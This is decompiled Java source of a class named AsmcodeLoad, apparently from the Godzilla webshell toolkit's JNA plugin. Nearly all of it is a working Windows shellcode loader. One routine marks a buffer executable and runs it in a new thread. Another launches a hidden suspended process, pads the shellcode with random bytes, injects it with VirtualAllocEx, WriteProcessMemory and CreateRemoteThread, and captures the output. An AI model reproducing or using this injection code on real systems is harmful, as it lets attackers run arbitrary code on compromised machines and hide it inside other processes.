/*     */ package jna.sun.jna.platform.godzilla;
/*     */ 
/*     */ import com.sun.jna.Memory;
/*     */ import com.sun.jna.Native;
/*     */ import com.sun.jna.Pointer;
/*     */ import com.sun.jna.platform.win32.BaseTSD;
/*     */ import com.sun.jna.platform.win32.WinBase;
/*     */ import com.sun.jna.platform.win32.WinDef;
/*     */ import com.sun.jna.platform.win32.WinNT;
/*     */ import com.sun.jna.ptr.IntByReference;
/*     */ import com.sun.jna.win32.StdCallLibrary;
/*     */ import com.sun.jna.win32.W32APIOptions;
/*     */ import java.io.ByteArrayOutputStream;
/*     */ import java.util.Random;
/*     */ import sun.plugin2.os.windows.Windows;
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ public class AsmcodeLoad
/*     */ {
/*  25 */   static IKernel32 kernel32 = (IKernel32)Native.loadLibrary(IKernel32.class, W32APIOptions.UNICODE_OPTIONS);
/*     */   static final long fix = 533504L;
/*     */   
/*     */   public static byte[] loadAsmBin(byte[] asm) throws Exception {
/*  29 */     Memory memory = new Memory(asm.length);
/*  30 */     memory.write(0L, asm, 0, asm.length);
/*  31 */     WinDef.DWORDByReference lpflOldProtect = new WinDef.DWORDByReference();
/*  32 */     if (kernel32.VirtualProtect((Pointer)memory, new BaseTSD.SIZE_T(asm.length), new WinDef.DWORD(64L), lpflOldProtect)) {
/*  33 */       if (kernel32.CreateThread(null, 0, (Pointer)memory, Pointer.NULL, 0, null)) {
/*  34 */         return "ok".getBytes();
/*     */       }
/*  36 */       return String.format("CreateThread fail Win32Errcode:%d", new Object[] { Integer.valueOf(kernel32.GetLastError()) }).getBytes();
/*     */     } 
/*  38 */     return String.format("VirtualProtect fail Win32Errcode:%d", new Object[] { Integer.valueOf(kernel32.GetLastError()) }).getBytes();
/*     */   }
/*     */   public static byte[] loadAsmBin(String commandLine, byte[] asm, int readWait) throws Exception {
/*  41 */     IntByReference intByReference = new IntByReference(0);
/*  42 */     byte[] asm2 = new byte[(int)(asm.length + 533504L)];
/*  43 */     Random random = new Random(System.nanoTime());
/*  44 */     for (int i = 0; i < 533504L; i++) {
/*  45 */       asm2[i] = (byte)random.nextInt();
/*     */     }
/*     */     
/*  48 */     System.arraycopy(asm, 0, asm2, 533504, asm.length);
/*     */     
/*  50 */     asm = asm2;
/*  51 */     Memory memory = new Memory(asm.length);
/*  52 */     memory.write(0L, asm, 0, asm.length);
/*  53 */     WinBase.PROCESS_INFORMATION pi = new WinBase.PROCESS_INFORMATION();
/*  54 */     WinBase.STARTUPINFO si = new WinBase.STARTUPINFO();
/*  55 */     si.cb = new WinDef.DWORD(si.size());
/*     */     
/*  57 */     WinNT.HANDLEByReference out_read = new WinNT.HANDLEByReference();
/*  58 */     WinNT.HANDLEByReference out_write = new WinNT.HANDLEByReference();
/*  59 */     WinBase.SECURITY_ATTRIBUTES securityAttributes = new WinBase.SECURITY_ATTRIBUTES();
/*  60 */     securityAttributes.bInheritHandle = true;
/*  61 */     securityAttributes.lpSecurityDescriptor = Pointer.NULL;
/*  62 */     securityAttributes.dwLength = new WinDef.DWORD(securityAttributes.size());
/*     */     
/*  64 */     if (kernel32.CreatePipe(out_read, out_write, securityAttributes, 0)) {
/*  65 */       si.hStdOutput = out_write.getValue();
/*  66 */       si.hStdError = out_write.getValue();
/*  67 */       si.dwFlags |= 0x100;
/*     */ 
/*     */       
/*  70 */       kernel32.SetHandleInformation(out_read.getValue(), 1, 0);
/*     */       
/*  72 */       if (kernel32.CreateProcess(null, commandLine, null, null, true, new WinDef.DWORD(134217732L), null, null, si, pi)) {
/*  73 */         Pointer pointer = kernel32.VirtualAllocEx(pi.hProcess, Pointer.NULL, new BaseTSD.SIZE_T(asm.length), 4096, 64);
/*  74 */         if (Pointer.nativeValue(pointer) != 0L) {
/*  75 */           if (kernel32.WriteProcessMemory(pi.hProcess, pointer, (Pointer)memory, asm.length, intByReference)) {
/*  76 */             Pointer.nativeValue(pointer, Pointer.nativeValue(pointer) + 533504L);
/*     */             
/*  78 */             WinNT.HANDLE thrdHANDLE = kernel32.CreateRemoteThread(pi.hProcess, null, 0, pointer, Pointer.NULL, 0, null);
/*  79 */             if (Pointer.nativeValue(thrdHANDLE.getPointer()) != 0L) {
/*  80 */               kernel32.CloseHandle(out_write.getValue());
/*  81 */               return readFile(out_read.getValue(), readWait);
/*     */             } 
/*  83 */             kernel32.TerminateProcess(pi.hProcess, 0);
/*  84 */             return String.format("Cannot CreateRemoteThread errcode:{0}\n", new Object[] { Integer.valueOf(Windows.GetLastError()) }).getBytes();
/*     */           } 
/*     */           
/*  87 */           kernel32.TerminateProcess(pi.hProcess, 0);
/*  88 */           return String.format("Cannot WriteProcessMemory errcode:{0}\n", new Object[] { Integer.valueOf(Windows.GetLastError()) }).getBytes();
/*     */         } 
/*     */ 
/*     */         
/*  92 */         kernel32.TerminateProcess(pi.hProcess, 0);
/*  93 */         return String.format("Cannot alloc memory errcode:%d\n", new Object[] { Integer.valueOf(Windows.GetLastError()) }).getBytes();
/*     */       } 
/*     */ 
/*     */       
/*  97 */       return String.format("Cannot create process errcode:%d\n", new Object[] { Integer.valueOf(Windows.GetLastError()) }).getBytes();
/*     */     } 
/*     */     
/* 100 */     return String.format("Cannot create pipe errcode:%d\n", new Object[] { Integer.valueOf(Windows.GetLastError()) }).getBytes();
/*     */   }
/*     */   
/*     */   private static byte[] readFile(WinNT.HANDLE file, int readMaxTime) throws Exception {
/* 104 */     long startTime = System.currentTimeMillis();
/* 105 */     ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
/* 106 */     byteArrayOutputStream.write("ok\n".getBytes());
/* 107 */     byte[] buffer = new byte[1042];
/* 108 */     while (readMaxTime + startTime > System.currentTimeMillis()) {
/* 109 */       IntByReference canRead = new IntByReference();
/* 110 */       if (kernel32.PeekNamedPipe(file, buffer, buffer.length, canRead, null, null)) {
/* 111 */         if (canRead.getValue() > 0) {
/* 112 */           IntByReference readNum = new IntByReference();
/* 113 */           if (kernel32.ReadFile(file, buffer, buffer.length, readNum, null)) {
/* 114 */             byteArrayOutputStream.write(buffer, 0, readNum.getValue());
/*     */             continue;
/*     */           } 
/*     */           break;
/*     */         } 
/*     */         try {
/* 120 */           Thread.sleep(50L);
/* 121 */         } catch (Exception exception) {}
/*     */       } 
/*     */     } 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 130 */     return byteArrayOutputStream.toByteArray();
/*     */   }
/*     */   
/*     */   static interface IKernel32 extends StdCallLibrary {
/*     */     boolean PeekNamedPipe(WinNT.HANDLE param1HANDLE, byte[] param1ArrayOfbyte, int param1Int, IntByReference param1IntByReference1, IntByReference param1IntByReference2, IntByReference param1IntByReference3);
/*     */     
/*     */     boolean CreatePipe(WinNT.HANDLEByReference param1HANDLEByReference1, WinNT.HANDLEByReference param1HANDLEByReference2, WinBase.SECURITY_ATTRIBUTES param1SECURITY_ATTRIBUTES, int param1Int);
/*     */     
/*     */     boolean SetHandleInformation(WinNT.HANDLE param1HANDLE, int param1Int1, int param1Int2);
/*     */     
/*     */     boolean CreateProcess(String param1String1, String param1String2, WinBase.SECURITY_ATTRIBUTES param1SECURITY_ATTRIBUTES1, WinBase.SECURITY_ATTRIBUTES param1SECURITY_ATTRIBUTES2, boolean param1Boolean, WinDef.DWORD param1DWORD, Pointer param1Pointer, String param1String3, WinBase.STARTUPINFO param1STARTUPINFO, WinBase.PROCESS_INFORMATION param1PROCESS_INFORMATION);
/*     */     
/*     */     Pointer VirtualAllocEx(WinNT.HANDLE param1HANDLE, Pointer param1Pointer, BaseTSD.SIZE_T param1SIZE_T, int param1Int1, int param1Int2);
/*     */     
/*     */     boolean WriteProcessMemory(WinNT.HANDLE param1HANDLE, Pointer param1Pointer1, Pointer param1Pointer2, int param1Int, IntByReference param1IntByReference);
/*     */     
/*     */     WinNT.HANDLE CreateRemoteThread(WinNT.HANDLE param1HANDLE, WinBase.SECURITY_ATTRIBUTES param1SECURITY_ATTRIBUTES, int param1Int1, Pointer param1Pointer1, Pointer param1Pointer2, int param1Int2, WinDef.DWORDByReference param1DWORDByReference);
/*     */     
/*     */     boolean CloseHandle(WinNT.HANDLE param1HANDLE);
/*     */     
/*     */     int GetLastError();
/*     */     
/*     */     boolean ReadFile(WinNT.HANDLE param1HANDLE, byte[] param1ArrayOfbyte, int param1Int, IntByReference param1IntByReference, WinBase.OVERLAPPED param1OVERLAPPED);
/*     */     
/*     */     boolean TerminateProcess(WinNT.HANDLE param1HANDLE, int param1Int);
/*     */     
/*     */     boolean VirtualProtect(Pointer param1Pointer, BaseTSD.SIZE_T param1SIZE_T, WinDef.DWORD param1DWORD, WinDef.DWORDByReference param1DWORDByReference);
/*     */     
/*     */     boolean CreateThread(WinBase.SECURITY_ATTRIBUTES param1SECURITY_ATTRIBUTES, int param1Int1, Pointer param1Pointer1, Pointer param1Pointer2, int param1Int2, WinDef.DWORDByReference param1DWORDByReference);
/*     */   }
/*     */ }


/* Location:              /Users/h12/Documents/网安工具/gesila/godzilla.jar!/shells/plugins/java/assets/GodzillaJna.jar!/jna/sun/jna/platform/godzilla/AsmcodeLoad.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */